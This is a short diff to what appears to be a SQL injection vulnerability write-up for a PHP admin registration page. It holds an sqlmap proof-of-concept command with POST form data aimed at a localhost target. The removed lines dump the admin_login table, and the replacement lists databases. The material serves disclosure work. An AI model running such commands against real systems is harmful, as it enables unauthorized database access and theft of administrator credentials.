@@ -55,9 +55,10 @@ sqlmap -u "http://localhost:8081/handgunner-administrator/register_code.php" \
   --data="fname=test&lname=test&address=test&city=test&province=test&country=test&zip=123&tel_no=123&email=test@test.com&username=test&password=pass123" \
   --batch \
   -D cj_handgunner \
-  -T admin_login \
-  --dump
+  --dbs
 ```
+
+![1767460492874.png](https://youke3.picui.cn/s1/2026/01/04/69594e5b40a68.png)
 
 **References**:
 - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
